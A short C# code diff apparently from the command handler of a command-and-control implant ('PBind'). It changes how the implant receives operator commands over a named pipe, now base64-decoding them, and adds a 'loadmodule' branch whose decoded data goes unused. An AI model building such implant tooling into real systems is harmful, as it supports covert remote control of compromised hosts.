@@ -58,16 +58,23 @@ public class PBind
         }
         else if (pbindConnected)
         {
-            var command = $"{string.Join(" ", args)}";
-            if (command.ToLower().Trim() == "kill-implant")
+            if (args[0].StartsWith("loadmodule"))
             {
-                pbindConnected = false;
-                IssueCommand(command);
-                pipe.Dispose();
-            }
-            else
-            {
-                IssueCommand(command);
+                byte[] data = Convert.FromBase64String(args[0].Replace("loadmodule", ""));
+                string command = Encoding.UTF8.GetString(data);
+            } else {
+                byte[] data = Convert.FromBase64String(args[0]);
+                string command = Encoding.UTF8.GetString(data);
+                if (command.ToLower().Trim() == "kill-implant")
+                {
+                    pbindConnected = false;
+                    IssueCommand(command);
+                    pipe.Dispose();
+                }
+                else
+                {
+                    IssueCommand(command);
+                }
             }
         }
         else
